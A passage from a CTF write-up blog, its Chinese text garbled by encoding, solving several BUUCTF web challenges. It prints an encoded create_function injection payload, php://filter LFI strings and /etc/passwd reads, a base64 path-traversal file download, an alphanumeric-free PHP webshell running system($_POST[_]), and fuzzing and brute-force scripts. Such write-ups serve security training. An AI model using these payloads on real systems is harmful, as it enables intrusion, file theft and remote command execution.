class="hljs-variable">%5</span>f<span class="hljs-variable">%69</span><span class="hljs-variable">%73</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%63</span><span class="hljs-variable">%75</span><span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%0</span>a&amp;<span class="hljs-variable">%73</span><span class="hljs-variable">%68</span><span class="hljs-variable">%61</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%61</span>[]<span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp;<span class="hljs-variable">%70</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%73</span><span class="hljs-variable">%77</span><span class="hljs-variable">%64</span>[]<span class="hljs-operator">=</span><span class="hljs-number">2</span>&amp;<span class="hljs-variable">%66</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%67</span>[<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%64</span><span class="hljs-variable">%65</span>]<span class="hljs-operator">=</span>create_function&amp;<span class="hljs-variable">%66</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%67</span>[<span class="hljs-variable">%61</span><span class="hljs-variable">%72</span><span class="hljs-variable">%67</span>]<span class="hljs-operator">=</span>&#125;require(~(<span class="hljs-variable">%8</span>f<span class="hljs-variable">%97</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%c5</span><span class="hljs-variable">%d0</span><span class="hljs-variable">%d0</span><span class="hljs-variable">%99</span><span class="hljs-variable">%96</span><span class="hljs-variable">%93</span><span class="hljs-variable">%8</span>b<span class="hljs-variable">%9</span>a<span class="hljs-variable">%8</span>d<span class="hljs-variable">%d0</span><span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span>a<span class="hljs-variable">%9</span>e<span class="hljs-variable">%9</span>b<span class="hljs-variable">%c2</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%90</span><span class="hljs-variable">%91</span><span class="hljs-variable">%89</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%8</span>d<span class="hljs-variable">%8</span>b<span class="hljs-variable">%d1</span><span class="hljs-variable">%9</span>d<span class="hljs-variable">%9</span>e<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%c9</span><span class="hljs-variable">%cb</span><span class="hljs-variable">%d2</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%91</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%90</span><span class="hljs-variable">%9</span>b<span class="hljs-variable">%9</span>a<span class="hljs-variable">%d0</span><span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span>a<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%90</span><span class="hljs-variable">%8</span>a<span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%c2</span><span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span>a<span class="hljs-variable">%9</span>e<span class="hljs-variable">%ce</span><span class="hljs-variable">%99</span><span class="hljs-variable">%93</span><span class="hljs-variable">%cb</span><span class="hljs-variable">%98</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%97</span><span class="hljs-variable">%8</span>f))<span class="hljs-comment">;//</span><br></code></pre></td></tr></table></figure>

<p>æœ€åç”¨base64ç¼–ç è§£ç è·å¾—flag</p>
<h2 id="ç½‘é¼æ¯-2020-åŠå†³èµ›-AliceWebsite"><a href="#ç½‘é¼æ¯-2020-åŠå†³èµ›-AliceWebsite" class="headerlink" title="[ç½‘é¼æ¯ 2020 åŠå†³èµ›]AliceWebsite"></a>[ç½‘é¼æ¯ 2020 åŠå†³èµ›]AliceWebsite</h2><p>å…ˆçœ‹çœ‹æºç ï¼Œæ²¡æœ‰ç»™ä»»ä½•æç¤ºï¼Œdirsearchä¹Ÿæ‰«ä¸å‡ºé™¤homeå’Œaboutçš„å…¶å®ƒç½‘å€<br>ç‚¹å‡»About Meå‘ç°urlå˜ä¸ºindex.php?action&#x3D;about.php<br>æŠŠactionåé¢æ”¹ä¸ºflag.php<br>é¡µé¢æ˜¾ç¤ºfile not found<br>å†è¯•è¯•å…¶å®ƒçš„<br>ç”¨ä¼ªåè®®è¯•è¯•</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?action=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure>
<p>è¯•è¯•&#x2F;etc&#x2F;passwd<br><img src="/images/9067B70DE08B4b389BD5FBB4272F280B.png" srcset="/img/loading.gif" lazyload><br>å¯ä»¥çœ‹åˆ°ç»“æœ<br>ä¼ ?action&#x3D;&#x2F;flagå°±å®Œæˆäº†<br>çœ‹ä¸‹æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>    <span class="hljs-variable">$action</span> = (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>] : <span class="hljs-string">&#x27;home.php&#x27;</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$action</span>)) &#123;<br>    	<span class="hljs-keyword">include</span> <span class="hljs-variable">$action</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>    	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;File not found!&quot;</span>;<br>    &#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>å› ä¸ºæœ‰file_existsï¼Œæ‰€ä»¥ä¸èƒ½ç”¨php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.phpä¼ªåè®®</p>
<h2 id="GKCTF-2021-easycms"><a href="#GKCTF-2021-easycms" class="headerlink" title="[GKCTF 2021]easycms"></a>[GKCTF 2021]easycms</h2><p>æ˜¯ä¸€ä¸ªé™æ€ç½‘é¡µï¼Œç‚¹å•¥éƒ½æ²¡æœ‰ç”¨(é™¤äº†å‹é“¾)ï¼Œç”¨dirsearchæ‰«ä¸€ä¸‹</p>
<p>å‘ç°æœ‰admin.php,æˆåŠŸè¿›å…¥ç™»å½•é¡µé¢</p>
<p><img src="/images/99D98BD3027C497cAB8A840DF127FDC1.png" srcset="/img/loading.gif" lazyload><br>é¢˜ç›®æœ‰æç¤ºå¯†ç æ˜¯äº”ä½å¼±å£ä»¤è´¦å·å¯†ç ä¸ºadmin&#x2F;12345<br>ç™»å½•è¿›æ¥å‘ç°å¯ä»¥äº¤äº’çš„å†…å®¹æœ‰å¾ˆå¤š<br>ç›´æ¥æ¡é‡è¦çš„æ¥è¯´</p>
<h3 id="ä»»æ„æ–‡ä»¶ä¸‹è½½"><a href="#ä»»æ„æ–‡ä»¶ä¸‹è½½" class="headerlink" title="ä»»æ„æ–‡ä»¶ä¸‹è½½"></a>ä»»æ„æ–‡ä»¶ä¸‹è½½</h3><p>è®¾è®¡-&gt;è‡ªå®šä¹‰-&gt;å¯¼å‡ºä¸»é¢˜-&gt;ä¿å­˜</p>
<p><img src="/images/D25A1F6DEE284e369961A29623FE7B9D.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/images/C9FC6F9337B54307916AF5EF4D9D2A72.png" srcset="/img/loading.gif" lazyload></p>
<p>ä¸‹è½½ä¸‹æ¥çš„æ–‡ä»¶å³é”®å¤åˆ¶ä¸‹è½½é“¾æ¥(è°·æ­Œå¤åˆ¶ä¸ä¸‹æ¥ï¼Œä¸åˆ°åœ¨å“ªï¼Œç”¨çš„æ˜¯ç«ç‹)<br><img src="/images/F94947C1B4D04d86873A3A0FD8238C53.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">http://7513b6ee-ccd7-4ed5-<span class="hljs-number">94b1</span>-7b5c82cc973b.node5.buuoj.cn:<span class="hljs-number">81</span>/admin.php?m=ui&amp;f=downloadtheme&amp;theme=L3Zhci93d3cvaHRtbC9zeXN0ZW0vdG1wL3RoZW1lL2RlZmF1bHQvMS56aXA=<br></code></pre></td></tr></table></figure>

<p><img src="/images/CD760DCECCA480691C7C185CE147638.png" srcset="/img/loading.gif" lazyload><br>base64è§£ç åå‘ç°themeåé¢çš„ä¸ºæ–‡ä»¶çš„ç»å¯¹è·¯å¾„<br>æˆ‘ä»¬ç›´æ¥æŠŠthemeåé¢æ›¿æ¢ä¸º&#x2F;flagï¼Œå¹¶base64åŠ å¯†</p>
<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">http://7513b6ee-ccd7-4ed5-<span class="hljs-number">94b1</span>-7b5c82cc973b.node5.buuoj.cn:<span class="hljs-number">81</span>/admin.php?m=ui&amp;f=downloadtheme&amp;theme=L2ZsYWc=<br></code></pre></td></tr></table></figure>
<p>ä¸‹è½½äº†ä¸€ä¸ªflag.zipå‹ç¼©åŒ…ï¼Œä¸ç”¨è§£å‹ç¼©ä¹Ÿä¸ç”¨æ‰“å¼€ï¼Œç›´æ¥nodepad++æ‰“å¼€æˆ–è€…æ”¹.txtåç¼€<br><img src="/images/FF264A94EC3C47f79000B7972E289283.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h3><p>åŒæ ·çš„é¡µé¢ï¼Œç‚¹å‡»ç¼–è¾‘,ç±»å‹ä¸ºphpæºä»£ç <br><img src="/images/9AC82E4C2F8E435aA5941A2F3F19F2B8.png" srcset="/img/loading.gif" lazyload><br>ä¿å­˜çš„æ—¶å€™è¦æˆ‘å…ˆåˆ›å»ºä¸€ä¸ªzlsjæ–‡ä»¶<br><img src="/images/6F173702649B4549980C8D150CCEC451.png" srcset="/img/loading.gif" lazyload><br>åˆ›å»ºæ–‡ä»¶ä½ç½®åœ¨è®¾è®¡-&gt;ç»„ä»¶-&gt;ç´ æåº“-&gt;ä¸Šä¼ ç´ æ<br><img src="/images/8EBF9E6A84AA40e3841ADBC68B5E501C.png" srcset="/img/loading.gif" lazyload><br>æœ¬åœ°åˆ›å»ºä¸€ä¸ªtxtæ–‡ä»¶ï¼Œå†…å®¹éšæ„<br>ä¸Šä¼ æ–‡ä»¶åç¼–è¾‘å®ƒçš„åç§°å¯å¯¼è‡´ç›®å½•ç©¿è¶Šåˆ›å»ºæ–‡ä»¶è‡³systemç›®å½•<br><img src="/images/D20C62AF621A4f66B4B27EE302E27DC6.png" srcset="/img/loading.gif" lazyload><br><img src="/images/27F9C4A104324dff9D5A44C9B5901830.png" srcset="/img/loading.gif" lazyload><br>ä¿å­˜ä¿®æ”¹åå¯ä»¥çœ‹åˆ°æ–‡ä»¶è·¯å¾„å¦‚ä¸Šï¼Œå†è¿”å›ä¸»é¢˜å¤„ç¼–è¾‘ç½‘é¡µå¤´éƒ¨æ’å…¥php<br><img src="/images/DD30018E870E4fae85E1572FFFC7BAAB.png" srcset="/img/loading.gif" lazyload><br>è¿™æ—¶å€™å°±èƒ½ä¿å­˜æˆåŠŸäº†ï¼Œè¿”å›ç½‘ç«™ä¸»é¡µæŸ¥çœ‹<br><img src="/images/84C51322BFB446e4AB1D58D42C084419.png" srcset="/img/loading.gif" lazyload><br>æˆåŠŸæ˜¾ç¤ºflag</p>
<h2 id="GXYCTF2019-StrongestMind"><a href="#GXYCTF2019-StrongestMind" class="headerlink" title="[GXYCTF2019]StrongestMind"></a>[GXYCTF2019]StrongestMind</h2><p>æ—¢ç„¶å®ƒè¯´äº†1000æ¬¡ç»™flagï¼Œé‚£å°±å†™ä¸ªè„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&#x27;http://f3f6839b-dc8a-4924-a329-53c9cf8fdd80.node5.buuoj.cn:81/&#x27;</span><br>data = &#123;<span class="hljs-string">&quot;answer&quot;</span>: <span class="hljs-number">1</span>&#125;<br>a = requests.session()<br><br><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    b = a.post(url=url, data=data)<br>    b.encoding = <span class="hljs-string">&#x27;utf-8&#x27;</span><br>    <span class="hljs-comment"># print(b.text)</span><br>    num = re.findall(<span class="hljs-string">r&#x27;(.*?)&lt;br&gt;&#x27;</span>, b.text)[<span class="hljs-number">6</span>]<br>    <span class="hljs-built_in">print</span>(num)<br>    num1 = <span class="hljs-built_in">eval</span>(num)<span class="hljs-comment">#å¯ä»¥å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºç®—æ•°å¼</span><br>    <span class="hljs-keyword">if</span> num1:<br>        data[<span class="hljs-string">&quot;answer&quot;</span>] = num1<br>    <span class="hljs-comment"># print(data)</span><br>    num2 = re.findall(<span class="hljs-string">r&#x27;(.*?)&lt;br&gt;&#x27;</span>, b.text)[<span class="hljs-number">3</span>]<br>    <span class="hljs-built_in">print</span>(num2)<br>    time.sleep(<span class="hljs-number">0.05</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;ç¬¬ 1001 æ¬¡æˆåŠŸå•¦&#x27;</span> <span class="hljs-keyword">in</span> b.text:<br>        <span class="hljs-built_in">print</span>(b.text)<br>        <span class="hljs-keyword">break</span><br><br></code></pre></td></tr></table></figure>


<h2 id="SUCTF-2018-GetShell"><a href="#SUCTF-2018-GetShell" class="headerlink" title="[SUCTF 2018]GetShell"></a>[SUCTF 2018]GetShell</h2><p>é¡µé¢æ²¡æœ‰ä»€ä¹ˆæ˜æ˜¾çš„ä¿¡æ¯ï¼Œçœ‹çœ‹æºç <br>æºç ä¸­æœ‰ä¸€ä¸ªè¶…é“¾æ¥?index.php?act&#x3D;upload<br>è¿›å…¥<br>çœ‹åˆ°æ˜¯æ–‡ä»¶ä¸Šä¼ <br>ä½†æ˜¯å…ˆä¸æ€¥ç€ä¸Šä¼ ï¼Œå®ƒæ—è¾¹ç»™äº†æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$contents</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]))&#123;<br>    <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$contents</span>,<span class="hljs-number">5</span>);<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$black_char</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$b</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$b</span>) !== <span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;illegal char&quot;</span>);<br>        &#125;<br>    &#125;     <br>&#125; <br></code></pre></td></tr></table></figure>
<p>å¤§æ„æ˜¯è·å–æ–‡ä»¶å†…å®¹ï¼Œä»ç¬¬6ä¸ªå­—ç¬¦å¼€å§‹æ¯”å¯¹é»‘åå•<br>è¿™é‡Œè¦fuzzä¸€ä¸‹ï¼Œçœ‹çœ‹å“ªäº›å­—ç¬¦å¯ä»¥ä½¿ç”¨</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests <span class="hljs-keyword">as</span> res<br><span class="hljs-keyword">import</span> time<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">url, alph</span>):<br>    header = &#123;<br>        <span class="hljs-string">&#x27;Host&#x27;</span>: <span class="hljs-string">&#x27;4ba5c0ca-9a4e-4d1e-9e8e-a5cbdc6fccb9.node5.buuoj.cn:81&#x27;</span>,<br>        <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;multipart/form-data; boundary=---------------------------37233154152715907679412218478&#x27;</span><br>    &#125;<br>    data = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">-----------------------------37233154152715907679412218478</span><br><span class="hljs-string">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.txt&quot;</span><br><span class="hljs-string">Content-Type: text/plain</span><br><span class="hljs-string"></span><br><span class="hljs-string">12345&#123;&#125;</span><br><span class="hljs-string">-----------------------------37233154152715907679412218478</span><br><span class="hljs-string">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">-----------------------------37233154152715907679412218478--</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>    <span class="hljs-comment"># è¿™é‡Œå› ä¸ºä¸Šä¼ çš„å†…å®¹è¿˜æœ‰ä¸Šä¼ æŒ‰é’®çš„å€¼&quot;æäº¤&quot;,æ‰€ä»¥é‡‡ç”¨encode(&#x27;utf-8&#x27;),ä½†å®é™…ä¸Šå¯ä»¥å»æ‰&quot;æäº¤&quot;ä¸Šä¼ ,è¿™é‡Œä¹Ÿå°±ä¸éœ€è¦encode(&#x27;utf-8&#x27;)äº†</span><br>    response = res.post(url, data=data.<span class="hljs-built_in">format</span>(alph).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>), headers=header)<br>    <span class="hljs-keyword">while</span> response.status_code != <span class="hljs-number">200</span>:<br>        time.sleep(<span class="hljs-number">0.3</span>)<br>        response = res.post(url, data=data.<span class="hljs-built_in">format</span>(alph).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>), headers=header)<br>    <span class="hljs-keyword">return</span> response.text<br><br><br>url = <span class="hljs-string">&quot;http://4ba5c0ca-9a4e-4d1e-9e8e-a5cbdc6fccb9.node5.buuoj.cn:81/index.php?act=upload&quot;</span><br>alphs = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">33</span>, <span class="hljs-number">127</span>):<br>    bak = check(url, <span class="hljs-built_in">chr</span>(i))<br>    <span class="hljs-keyword">if</span> bak.find(<span class="hljs-string">&quot;illegal&quot;</span>, <span class="hljs-number">0</span>) == -<span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Can use &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">chr</span>(i)))<br>        alphs += <span class="hljs-built_in">chr</span>(i)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Cn&#x27;t use &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">chr</span>(i)))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*&#x27;</span> + alphs + <span class="hljs-string">&#x27;*]&#x27;</span>)<br></code></pre></td></tr></table></figure>

<p>çˆ†å‡ºè¿™äº›å­—ç¬¦å¯ä»¥ä½¿ç”¨</p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">$().;=[]_~<br></code></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°æ•°å­—å³è‹±æ–‡å­—æ¯éƒ½è¢«è¿‡æ»¤äº†ï¼Œè¿™é‡Œä½¿ç”¨ç‰¹æ®Šçš„æœ¨é©¬æ„é€ æ–¹å¼<br><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">ä¸€äº›ä¸åŒ…å«æ•°å­—å’Œå­—æ¯çš„webshell</a><br>è¿™é‡Œæˆ‘ä»¬é‡‡ç”¨å–åçš„æ–¹æ³•<br><img src="/images/A0673E9D30148b08CF1B9FA38C9B997.png" srcset="/img/loading.gif" lazyload><br>ç”¨å®ƒçš„æ–¹æ³•æ„é€ phpä¸€å¥è¯æœ¨é©¬</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">&lt;?=<br><span class="hljs-variable">$_</span>=[];<span class="hljs-regexp">//</span>array<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>.<span class="hljs-variable">$_</span>;<span class="hljs-regexp">//</span>arrayarray<br><span class="hljs-variable">$___</span>=(<span class="hljs-variable">$_</span>==<span class="hljs-variable">$__</span>);<span class="hljs-regexp">//</span>array==arrayarray é”™è¯¯ä¸ºfalse<br><span class="hljs-variable">$____</span> = (<span class="hljs-variable">$_</span>==<span class="hljs-variable">$_</span>);<span class="hljs-regexp">//</span>array==arrayç›¸åŒtrue<br><span class="hljs-variable">$_____</span>=~(åŒº[<span class="hljs-variable">$____</span>]).~(å†ˆ[<span class="hljs-variable">$____</span>]).~(åŒº[<span class="hljs-variable">$____</span>]).~(å‹º[<span class="hljs-variable">$____</span>]).~(çš®[<span class="hljs-variable">$____</span>]).~(é’ˆ[<span class="hljs-variable">$____</span>]);<span class="hljs-regexp">//</span>system<br><span class="hljs-variable">$______</span>=~(ç [<span class="hljs-variable">$____</span>]).~(å¯¸[<span class="hljs-variable">$____</span>]).~(å°[<span class="hljs-variable">$____</span>]).~(æ¬ [<span class="hljs-variable">$____</span>]).~(ç«‹[<span class="hljs-variable">$____</span>]);<span class="hljs-regexp">//</span>_POST<br><span class="hljs-variable">$_____</span>($<span class="hljs-variable">$______</span>[_]);<span class="hljs-regexp">//</span>system(<span class="hljs-variable">$_POST</span>[_])<br></code></pre></td></tr></table></figure>

<p>å»æ‰æ¢è¡Œç¬¦å’Œç©ºæ ¼</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">&lt;<span class="hljs-string">?=</span><span class="hljs-variable">$_</span>=[];<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>.<span class="hljs-variable">$_</span>;<span class="hljs-variable">$___</span>=(<span class="hljs-variable">$_</span>==<span class="hljs-variable">$__</span>);<span class="hljs-variable">$____</span>=(<span class="hljs-variable">$_</span>==<span class="hljs-variable">$_</span>);<span class="hljs-variable">$_____</span>=~(åŒº[<span class="hljs-variable">$____</span>]).~(å†ˆ[<span class="hljs-variable">$____</span>]).~(åŒº[<span class="hljs-variable">$____</span>]).~(å‹º[<span class="hljs-variable">$____</span>]).~(çš®[<span class="hljs-variable">$____</span>]).~(é’ˆ[<span class="hljs-variable">$____</span>]);<span class="hljs-variable">$______</span>=~(ç [<span class="hljs-variable">$____</span>]).~(å¯¸[<span class="hljs-variable">$____</span>]).~(å°[<span class="hljs-variable">$____</span>]).~(æ¬ [<span class="hljs-variable">$____</span>]).~(ç«‹[<span class="hljs-variable">$____</span>]);<span class="hljs-variable">$_____</span>(<span class="hljs-variable">$$</span>______[_]);<br></code></pre></td></tr></table></figure>
<p>ä¸Šé¢ä»£ç æ„é€ çš„è¯­å¥æ˜¯system($<em>POST[</em>])<br>è¿™é‡Œä¸èƒ½æœ‰ç©ºæ ¼å’Œæ¢è¡Œï¼Œç©ºæ ¼ä¹Ÿæ˜¯é»‘åå•<br><img src="/images/DE7C1B6F097F489aB811A0A0399DD9C6.png" srcset="/img/loading.gif" lazyload><br>è¿™é‡Œç»™äº†åœ°å€ï¼Œç›´æ¥è¿›<br><img src="/images/420215618600528ACB7BA8F63A399C1.png" srcset="/img/loading.gif" lazyload><br>æ ¹ç›®å½•çš„flagæ˜¯ä¸ªå‡flag<br>è¿™é‡Œå¯ä»¥ä½¿ç”¨envæ˜¾ç¤ºç³»ç»Ÿä¸­çš„ç¯å¢ƒå˜é‡æ¥æŸ¥çœ‹flag<br><img src="/images/D80FD0676FEA46aaACD213245E7F2226.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="WMCTF2020-Make-PHP-Great-Again"><a href="#WMCTF2020-Make-PHP-Great-Again" class="headerlink" title="[WMCTF2020]Make PHP Great Again"></a>[WMCTF2020]Make PHP Great Again</h2><p>æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">require_once</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>&#125;<br></code></pre></td></tr></table></figure>

<p><strong>è§£æ³•ä¸€:</strong></p>
<p>è¿™é“é¢˜æ²¡æœ‰ä½¿ç”¨æ–‡ä»¶åŒ…å«è€ƒç‚¹ç»å¸¸å‡ºç°çš„include(),è€Œæ˜¯requir_once(),è¿™ä¸ªå‡½æ•°çš„ç‰¹ç‚¹æ˜¯åªåŒ…å«ä¸€æ¬¡ï¼Œå› ä¸ºåˆšæ‰æ˜¯å·²ç»require_once â€˜flag.phpâ€™ äº†ï¼Œä¸èƒ½å†æ¬¡åŒ…å«ï¼Œæ‰€ä»¥éœ€è¦ç»•è¿‡require_once(),è®©å®ƒæ£€æµ‹ä¼ å…¥çš„æ–‡ä»¶åå“ˆå¸Œå€¼æ—¢æ²¡æœ‰é‡å¤ï¼Œåˆèƒ½è¯»åˆ°flag.phpè¿™ä¸ªæ–‡ä»¶</p>
<p>require_once()åœ¨å¯¹è½¯è¿æ¥çš„æ“ä½œä¸Šå­˜åœ¨ä¸€äº›ç¼ºé™·ï¼Œè½¯è¿æ¥å±‚æ•°è¾ƒå¤šä¼šæ˜¯hashåŒ¹é…ç›´æ¥å¤±æ•ˆé€ æˆé‡å¤åŒ…å«ï¼Œè¶…è¿‡20æ¬¡è½¯é“¾æ¥åå¯ä»¥ç»•è¿‡ï¼Œå¤–åŠ ä¼ªåè®®ç¼–ç ä¸€ä¸‹</p>
<p>&#x2F;proc&#x2F;self&#x2F;æ˜¯åªæƒ³å½“å‰è¿›ç¨‹çš„&#x2F;proc&#x2F;pid&#x2F;ï¼Œè€Œ&#x2F;proc&#x2F;self&#x2F;rootæ˜¯æŒ‡å‘&#x2F;(æ ¹ç›®å½•)çš„è½¯é“¾æ¥ï¼Œæ‰€ä»¥è®©è½¯é“¾æ¥å±‚æ•°å˜å¤šå³å¯é€ æˆé‡å¤åŒ…å«</p>
